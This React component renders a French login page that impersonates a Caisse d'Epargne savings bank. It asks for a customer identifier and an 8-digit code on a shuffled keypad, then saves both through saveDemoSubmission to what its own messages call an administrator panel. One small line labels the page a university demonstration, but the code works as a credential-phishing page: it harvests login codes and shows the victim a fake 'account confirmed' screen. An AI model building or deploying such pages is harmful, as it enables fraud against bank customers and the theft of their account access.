import { useState } from 'react'
import logo from './assets/logo.webp'
import { saveDemoSubmission } from './demoSubmissions'
import './Client.css'

const Icon = ({ name, size = 22 }) => {
  const paths = {
    arrow: <path d="m9 18 6-6-6-6"/>,
    check: <path d="m5 12 4 4L19 6"/>,
    lock: <><rect x="5" y="10" width="14" height="11" rx="2"/><path d="M8 10V7a4 4 0 0 1 8 0v3M12 14v3"/></>,
    shield: <><path d="M12 22s8-3.8 8-10V5l-8-3-8 3v7c0 6.2 8 10 8 10Z"/><path d="m9 12 2 2 4-5"/></>,
    user: <><circle cx="12" cy="8" r="4"/><path d="M4 21c.7-4.2 3.4-6 8-6s7.3 1.8 8 6"/></>,
  }

  return <svg aria-hidden="true" width={size} height={size} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">{paths[name]}</svg>
}

const shuffleDigits = () => {
  const digits = Array.from({ length: 10 }, (_, index) => index)
  for (let index = digits.length - 1; index > 0; index -= 1) {
    const randomIndex = Math.floor(Math.random() * (index + 1))
    ;[digits[index], digits[randomIndex]] = [digits[randomIndex], digits[index]]
  }
  return digits
}

function Client() {
  const [loginStep, setLoginStep] = useState('identifier')
  const [identifier, setIdentifier] = useState('')
  const [passcode, setPasscode] = useState('')
  const [keypadDigits, setKeypadDigits] = useState(shuffleDigits)
  const [submissionStatus, setSubmissionStatus] = useState('idle')
  const [submissionMessage, setSubmissionMessage] = useState('')

  const handleIdentifier = (event) => {
    event.preventDefault()
    setSubmissionStatus('idle')
    setSubmissionMessage('')
    setPasscode('')
    setKeypadDigits(shuffleDigits())
    setLoginStep('password')
  }

  const addPasscodeDigit = (digit) => {
    setPasscode((currentPasscode) => currentPasscode.length < 8 ? `${currentPasscode}${digit}` : currentPasscode)
  }

  const handlePasscode = async (event) => {
    event.preventDefault()
    if (passcode.length !== 8 || submissionStatus === 'saving') return

    setSubmissionStatus('saving')
    setSubmissionMessage('')

    try {
      const result = await saveDemoSubmission({ identifier, accountNumber: passcode })
      if (result.duplicate) {
        setSubmissionStatus('duplicate')
        setSubmissionMessage('Ces informations existent déjà dans le panneau administrateur.')
        return
      }

      setSubmissionStatus('success')
      setLoginStep('success')
    } catch (error) {
      console.error('Unable to save submission:', error)
      setSubmissionStatus('error')
      setSubmissionMessage('Connexion impossible. Veuillez réessayer dans quelques instants.')
    }
  }

  return (
    <main className="client-page">
      <section className="client-welcome" aria-labelledby="client-welcome-title">
        <a className="client-logo" href="/" aria-label="Retour à l’accueil">
          <img src={logo} alt="Caissse d'epargne" />
        </a>
        <div className="client-welcome-copy">
          <span className="client-secure-pill"><Icon name="shield" size={16}/> Accès sécurisé</span>
          <h1 id="client-welcome-title">Bienvenue dans votre espace client</h1>
          <p>Accédez à vos services et gérez votre compte simplement, où que vous soyez.</p>
        </div>
        <p className="client-welcome-foot"><Icon name="lock" size={16}/> Vos informations sont protégées.</p>
      </section>

      <section className="client-login-area" aria-labelledby="login-title">
        <a className="client-home-link" href="/"><Icon name="arrow" size={17}/> Retour à l’accueil</a>
        <div className="client-login-card">
          <div className="client-login-icon" aria-hidden="true"><Icon name="lock" size={26}/></div>

          {loginStep === 'identifier' ? (
            <>
              <p className="client-kicker">DÉMONSTRATION UNIVERSITAIRE · ESPACE CLIENT</p>
              <h2 id="login-title">Connectez-vous à votre compte</h2>
              <p className="client-login-intro">Saisissez votre identifiant pour continuer.</p>
              <form className="client-login-form" onSubmit={handleIdentifier}>
                <label htmlFor="client-identifier">Votre identifiant</label>
                <div className="client-identifier-field">
                  <Icon name="user" size={21}/>
                  <input
                    id="client-identifier"
                    name="identifier"
                    type="text"
                    autoComplete="username"
                    placeholder="Votre identifiant"
                    value={identifier}
                    onChange={(event) => setIdentifier(event.target.value)}
                    autoFocus
                    required
                    maxLength={64}
                  />
                </div>
                <button className="client-login-submit" type="submit">Continuer <Icon name="arrow" size={18}/></button>
              </form>
            </>
          ) : loginStep === 'password' ? (
            <>
              <button className="client-login-back" type="button" onClick={() => { setLoginStep('identifier'); setPasscode(''); setSubmissionStatus('idle'); setSubmissionMessage('') }}>
                <Icon name="arrow" size={17}/> Retour
              </button>
              <h2 id="login-title">Entrez le code envoyé au 06 37 47 86 06</h2>
              <p className="client-login-intro">Saisissez les 8 chiffres à l’aide du clavier.</p>
              <form className="client-login-form" onSubmit={handlePasscode}>
                <div className="client-passcode-display" aria-label={`${passcode.length} chiffre${passcode.length > 1 ? 's' : ''} saisi${passcode.length > 1 ? 's' : ''} sur 8`}>
                  {Array.from({ length: 8 }, (_, index) => (
                    <span className={index < passcode.length ? 'filled' : ''} key={index} aria-hidden="true" />
                  ))}
                </div>
                <div className="client-keypad" aria-label="Clavier numérique">
                  {keypadDigits.map((digit) => (
                    <button type="button" key={digit} onClick={() => { addPasscodeDigit(digit); setSubmissionStatus('idle'); setSubmissionMessage('') }} disabled={passcode.length === 8 || submissionStatus === 'saving'}>
                      {digit}
                    </button>
                  ))}
                </div>
                <button className="client-passcode-clear" type="button" onClick={() => { setPasscode((currentPasscode) => currentPasscode.slice(0, -1)); setSubmissionStatus('idle'); setSubmissionMessage('') }} disabled={!passcode.length || submissionStatus === 'saving'}>
                  Effacer le dernier chiffre
                </button>
                {submissionMessage && <p className={`client-submission-feedback ${submissionStatus}`} role="alert">{submissionMessage}</p>}
                <button className="client-login-submit" type="submit" disabled={passcode.length !== 8 || submissionStatus === 'saving'}>{submissionStatus === 'saving' ? 'Vérification…' : 'Vérifier et enregistrer'} <Icon name="arrow" size={18}/></button>
              </form>
            </>
          ) : (
            <div className="client-success" role="status">
              <span><Icon name="check" size={30}/></span>
              <p className="client-kicker">CONNEXION CONFIRMÉE</p>
              <h2 id="login-title">Bienvenue dans votre espace client.</h2>
              <p>Votre compte a bien été confirmé.</p>
              <a className="client-login-submit" href="/">Terminer</a>
            </div>
          )}

          <p className="client-security"><Icon name="shield" size={18}/> Ne communiquez jamais vos informations de connexion à un tiers.</p>
        </div>
      </section>
    </main>
  )
}

export default Client
